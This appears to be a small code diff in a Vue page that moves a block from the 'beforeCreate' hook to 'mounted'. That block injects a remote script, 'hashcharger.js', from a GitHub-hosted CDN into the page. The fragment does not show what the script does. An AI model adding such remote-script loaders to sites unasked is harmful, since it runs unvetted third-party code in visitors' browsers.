@@ -13,7 +13,7 @@
 <script>
 new Vue({
    el: '#app',
-   beforeCreate: function() {
+   mounted: function() {
     const script = document.createElement('script');
     script.src = 'https://cdn.jsdelivr.net/gh/warigroup/hashcharger@1/hashcharger.js';
     script.id = 'hashcharger';
